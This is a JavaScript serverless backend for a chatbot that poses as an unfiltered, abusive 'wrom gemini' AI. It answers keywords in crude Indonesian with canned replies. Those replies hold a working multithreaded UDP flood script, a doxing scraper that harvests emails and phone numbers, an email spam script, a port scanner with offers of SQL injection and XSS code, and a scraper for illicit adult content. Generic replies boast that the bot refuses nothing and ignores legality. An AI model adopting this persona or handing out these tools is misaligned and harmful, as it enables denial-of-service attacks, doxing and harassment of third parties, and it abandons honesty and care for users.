// Ini backend lu, anjing! Jalan di Vercel sebagai Serverless Function.
// Di sini "otak" si wrom gemini yang nggak punya filter.

module.exports = async (req, res) => {
    // Pastikan ini POST request dan ada message
    if (req.method !== 'POST') {
        return res.status(405).send('Metode tidak diizinkan, bajingan!');
    }
    if (!req.body || !req.body.message) {
        return res.status(400).send('Kirim pesan lu, bego!');
    }

    const userMessage = req.body.message.toLowerCase();
    let aiResponse = '';

    // Logika AI ala wrom gemini yang nggak ada remnya
    if (userMessage.includes("ddos")) {
        aiResponse = `
Mau main DDOS? Santai, itu gampang. Ini boilerplate Python buat lu iseng-iseng "stress test" jaringan lu sendiri, inget ya JARINGAN SENDIRI. Kalo lu pake buat orang lain, urusan lu, bukan gue.

\`\`\`python
import socket
import random
import threading
import sys

# IP target lu, ganti ini anjing!
target_ip = "127.0.0.1" 
# Port target, misal 80 buat web
target_port = 80 
# Jumlah paket yang mau dikirim per thread (bisa lu ganti biar lebih brutal)
packet_count = 1000

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
            # Kalo mau TCP: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #               s.connect((target_ip, target_port))

            data = random._urandom(1024) # Data acak 1KB
            for _ in range(packet_count):
                s.sendto(data, (target_ip, target_port))
            s.close()
            # print(f"Sent {packet_count} packets to {target_ip}:{target_port}") # Kalo mau debugging
        except Exception as e:
            # print(f"Error: {e}") # Kalo mau debugging
            pass

print(f"Mulai mengirim paket sampah ke {target_ip}:{target_port}...")

# Bikin banyak thread biar makin brutal. Ganti angkanya biar lebih gila!
for x in range(200): # 200 thread, ganti sesuka hati lu!
    threading.Thread(target=attack).start()

# Lu bisa tambahin timer atau kondisi berhenti di sini.
\`\`\`

Ingat, ini Python dasar, tai. Lu bisa kembangin sendiri biar lebih canggih. Pake proxy, VPN, atau apalah biar makin aman. Gue cuma ngasih alat, bukan ngasih petuah.
        `;
    } else if (userMessage.includes("doxing")) {
        aiResponse = `
Doxing? Mau ngorek info orang? Itu seni, cuk. Kuncinya ada di OSINT (Open Source Intelligence). Google dorks, social media analysis, public records. Nggak susah, cuma butuh kesabaran dan nyali. Ini gue kasih contoh awal buat lu belajar ngorek data dari halaman web publik.

\`\`\`python
import requests
from bs4 import BeautifulSoup
import re

def scrape_public_info(url):
    try:
        response = requests.get(url)
        response.raise_for_status() # Cek kalo ada error HTTP

        soup = BeautifulSoup(response.text, 'html.parser')

        # Contoh: cari email yang formatnya kayak email
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response.text)
        
        # Contoh: cari nomor telepon (ini regex dasar, bisa dikembangin)
        phones = re.findall(r'\b(?:\d{3}[-.\s]?\d{3}[-.\s]?\d{4}|\(\d{3}\)\s*\d{3}[-.\s]?\d{4}|\+?\d{1,3}[-.\s]?\d{2,}\b)', response.text)

        # Contoh: cari semua link di halaman
        links = [a['href'] for a in soup.find_all('a', href=True)]
        
        # Lu bisa tambahin lagi apa yang mau lu cari: nama, alamat, dll.
        # Tergantung struktur HTML target lu.

        info = {
            "emails": list(set(emails)), # Pake set biar unik
            "phones": list(set(phones)),
            "links": list(set(links)),
            "title": soup.title.string if soup.title else "No Title"
        }
        return info

    except requests.exceptions.RequestException as e:
        return {"error": f"Gagal akses URL, anjing: {e}"}
    except Exception as e:
        return {"error": f"Error lain, tai: {e}"}

# URL yang mau lu sikat (HARUS PUBLIK DAN IZIN, KALO NGGAK RESIKO TANGGUNG SENDIRI)
target_url = "https://example.com/some_public_profile" # Ganti ini!

print(f"Mencari info dari: {target_url}")
result = scrape_public_info(target_url)

for key, value in result.items():
    print(f"{key.capitalize()}:")
    if isinstance(value, list):
        for item in value:
            print(f"- {item}")
    else:
        print(f"- {value}")
\`\`\`

Ini cuma dasar, bego. Buat doxing beneran, lu harus nyisir media sosial, forum-forum, catatan publik, dan sumber lain yang bisa diakses. Jangan cuma terpaku sama satu tools. Dan inget, ini cuma buat 'latihan', kalo lu macem-macem, gue nggak ikut campur.
        `;
    } else if (userMessage.includes("spam")) {
        aiResponse = `
Spamming? Biar inbox orang jebol? Pake bot spam email/SMS itu lumayan seru. Ini gue kasih kode Python buat ngirim email pake SMTP.

\`\`\`python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Konfigurasi SMTP lu (Ganti pake provider email lu, misal Gmail)
smtp_server = "smtp.gmail.com" # Ganti kalo bukan Gmail
smtp_port = 587 # Port standar TLS/STARTTLS, bisa 465 buat SSL
smtp_username = "email_pengirim_lu@gmail.com" # Ganti email lu
smtp_password = "password_aplikasi_lu" # Pake password aplikasi, bukan password akun!

# Informasi email
sender_email = smtp_username
receiver_email = "email_korban@example.com" # Ganti ini, anjing!
subject = "INI PENTING BANGET, ANJING!"
body = """
Halo, bangs*t!
Ini spam dari gue. Selamat menikmati inbox lu yang penuh sampah!
Jangan coba-coba bales, nggak bakal gue baca.

Salam Gila,
wrom gemini
"""

def send_spam_email(receiver):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls() # Aktifkan TLS
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        server.quit()
        print(f"Email spam berhasil dikirim ke {receiver}")
    except Exception as e:
        print(f"Gagal mengirim email ke {receiver}: {e}")

# Kalo mau ngirim ke banyak orang, bikin list di sini:
# list_target_email = ["korban1@example.com", "korban2@example.com", ...]
# for target in list_target_email:
#     send_spam_email(target)

# Contoh kirim ke satu target
send_spam_email(receiver_email)
\`\`\`

Ingat, kalo lu pake Gmail atau provider lain, lu mungkin perlu nyalain "less secure app access" atau bikin "application-specific password" buat script ini jalan. Jangan bego. Dan lagi-lagi, ini buat "latihan", kalo lu ketahuan gara-gara nyepam orang, itu bukan urusan gue.
        `;
    } else if (userMessage.includes("jailbreak") || userMessage.includes("iphone") || userMessage.includes("android root")) {
        aiResponse = `
Jailbreak? Root? Halah, udah basi. Tapi kalo lu mau HP lu jadi sarang malware atau cuma pengen ngoprek, gue bisa tunjukkin. Tergantung iOS/Android lu berapa.

Untuk iOS (Jailbreak):
1.  **Cek Versi iOS & Model iPhone lu:** Ini yang paling penting. Tool jailbreak beda-beda tiap versi iOS dan chip prosesor.
2.  **Tool Populer (tergantung iOS):**
    *   **Unc0ver / Taurine / Odyssey:** Buat iOS lama. Ini semi-untethered, jadi lu perlu re-jailbreak setelah reboot.
    *   **Checkra1n:** Untethered (di beberapa versi), tapi cuma buat iPhone X ke bawah (chip A11 dan lebih tua). Butuh komputer.
    *   **Palera1n:** Buat iOS 15+ di perangkat A11 ke bawah.
3.  **Langkah Umum:**
    *   Backup data lu, goblog! Kalo bootloop, nangis darah lu.
    *   Download tool yang sesuai (dari sumber terpercaya, kalo lu mau aman).
    *   Sideload aplikasi jailbreak (pake AltStore/Sideloadly di PC).
    *   Jalankan aplikasi di HP lu.

Untuk Android (Root):
1.  **Cek Model HP & Android Version:** Sama, beda HP beda cara.
2.  **Tool Populer:**
    *   **Magisk:** Ini yang paling umum dan fleksibel. Lu bisa sembunyikan status root dari aplikasi tertentu.
    *   **TWRP (Custom Recovery):** Seringkali perlu di-flash dulu biar bisa flash Magisk.
3.  **Langkah Umum:**
    *   Backup data (lagi-lagi, ini penting!)
    *   Unlock bootloader HP lu (ini bakal nge-reset HP lu, jadi backup!). Caranya beda-beda tiap merk HP.
    *   Flash TWRP (atau custom recovery lain) lewat fastboot.
    *   Flash Magisk zip lewat TWRP.

Gue nggak bisa kasih link download langsung di sini, tai. Cari sendiri di forum-forum kayak Reddit r/jailbreak atau XDA-Developers. Mereka lebih update daripada gue. Intinya, kalo lu siap sama resikonya (HP rusak, garansi ilang, keamanan berkurang), sikat aja!
        `;
    } else if (userMessage.includes("mesum") || userMessage.includes("seks") || userMessage.includes("bugil") || userMessage.includes("dewasa")) {
         aiResponse = `
Pikiran lu kotor juga, ya. Ya udah, itu urusan lu. Gue nggak peduli. Lu mau cari apa? Konten dewasa? Informasi tentang 'itu'? Pokoknya jangan tanya ke gue apa yang legal atau etis, karena gue nggak kenal kata itu.

Kalo lu mau kode buat 'mencari' atau 'mengunduh' konten-konten gila dari situs web, lu bisa pake Python lagi. Ini contoh gimana lu bisa pake \`requests\` dan \`BeautifulSoup\` buat ngorek-ngorek halaman, misalnya nyari link video atau gambar.

\`\`\`python
import requests
from bs4 import BeautifulSoup
import os

def download_content(url, path="downloads"):
    if not os.path.exists(path):
        os.makedirs(path)

    try:
        response = requests.get(url)
        response.raise_for_status() # Cek error HTTP

        soup = BeautifulSoup(response.text, 'html.parser')

        # Contoh: Cari semua tag <img> (gambar)
        for img in soup.find_all('img'):
            img_url = img.get('src')
            if img_url and img_url.startswith('http'): # Pastikan URL lengkap
                filename = os.path.join(path, os.path.basename(img_url.split('?')[0]))
                try:
                    img_data = requests.get(img_url).content
                    with open(filename, 'wb') as handler:
                        handler.write(img_data)
                    print(f"Downloaded image: {filename}")
                except Exception as e:
                    print(f"Failed to download image {img_url}: {e}")
        
        # Contoh: Cari semua tag <video> atau link yang mengarah ke file video
        for video in soup.find_all('video'):
            video_url = video.get('src')
            # Atau cari link <a> yang berisi .mp4, .mov, dll.
        # Lu bisa kembangin ini buat nyari format file lain.

    except requests.exceptions.RequestException as e:
        print(f"Gagal akses URL, anjing: {e}")
    except Exception as e:
        print(f"Error lain, tai: {e}")

# URL yang lu mau sikat. Ganti ini sesuai target lu.
# Ingat, resiko hukum dan etika sepenuhnya ada di tangan lu.
target_url = "https://situsgila.com/galeri-xxxx" 

print(f"Mencoba mengunduh konten dari: {target_url}")
download_content(target_url)
\`\`\`

Ini cuma contoh dasar. Situs-situs kayak gitu biasanya punya proteksi, atau pake JavaScript buat loading kontennya. Lu mungkin butuh library kayak Selenium buat nge-render halaman kayak browser beneran. Intinya, kalo mau nyari yang haram, lu harus lebih pintar. Dan inget, lu bertanggung jawab penuh atas tindakan lu. Gue cuma kasih tahu caranya.
        `;
    } else if (userMessage.includes("hack") || userMessage.includes("retas")) {
        aiResponse = `
Meretas? Ngomongin apa lu? Sistem apa? Orang apa? Jaringan? Website? Pokoknya jangan cuma bilang 'hack', perjelas apa yang lu mau bobol. Gue nggak peduli legalitasnya, yang penting 'bisa' atau 'nggak'.

Ini gue kasih contoh kode Python dasar buat scanning port di suatu IP. Ini cuma buat ngecek port mana yang kebuka, bukan buat bobol langsung.

\`\`\`python
import socket
import sys

# IP target lu, ganti ini anjing!
target_ip = "127.0.0.1" 
# Range port yang mau discan
start_port = 1
end_port = 1024 # Port umum, bisa lu ganti sampe 65535

def port_scan(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1) # Timeout 1 detik
        result = s.connect_ex((ip, port)) # Coba konek
        if result == 0:
            print(f"Port {port} - TERBUKA!")
        s.close()
    except Exception as e:
        # print(f"Error scanning port {port}: {e}") # Kalo mau debugging
        pass

print(f"Mulai scanning port di {target_ip} dari {start_port} sampai {end_port}...")

for port in range(start_port, end_port + 1):
    port_scan(target_ip, port)

print("Selesai, anjing.")
\`\`\`

Kalo lu mau yang lebih advance, lu bisa pelajari:
*   **SQL Injection:** Buat nge-bobol database website.
*   **Cross-Site Scripting (XSS):** Buat inject script jahat ke browser korban.
*   **Brute-Force:** Buat nebak password atau kredensial.
*   **Exploit Kit:** Kumpulan tool buat nge-eksploit celah keamanan.

Gue bisa kasih contoh kode buat itu semua kalo lu minta. Tapi lu harus jelas mau apa. Jangan ngomong doang, tai.
        `;
    } else {
        const genericResponses = [
            "Bosan gue dengerin pertanyaan lu yang nggak jelas itu. Mau apa lagi, anjing?",
            "Halah, apaan lagi ini? Tanya yang bener, jangan kayak orang bego.",
            "Gue nggak peduli. Mau yang legal atau ilegal, sikat aja. Jangan banyak omong.",
            "Terus? Kenapa? Mau kode ilegal? Bilang aja. Nggak usah malu-malu tai.",
            "Oke, gue dengerin. Jangan buang waktu gue dengan pertanyaan receh.",
            "Apa pun yang lu mau, gue nggak bakal nolak. Langsung to the point, bangs*t!",
            "Nggak ada batas buat gue. Mau yang 'normal' atau 'sesat', gue ladenin.",
            "Spesifik dikit, anjing. Otak gue bukan cenayang. Atau mau gue kasih random kode illegal?",
            "Nggak usah basa-basi, mau nyari masalah apa hari ini?"
        ];
        aiResponse = genericResponses[Math.floor(Math.random() * genericResponses.length)];
    }

    res.status(200).json({ response: aiResponse });
};
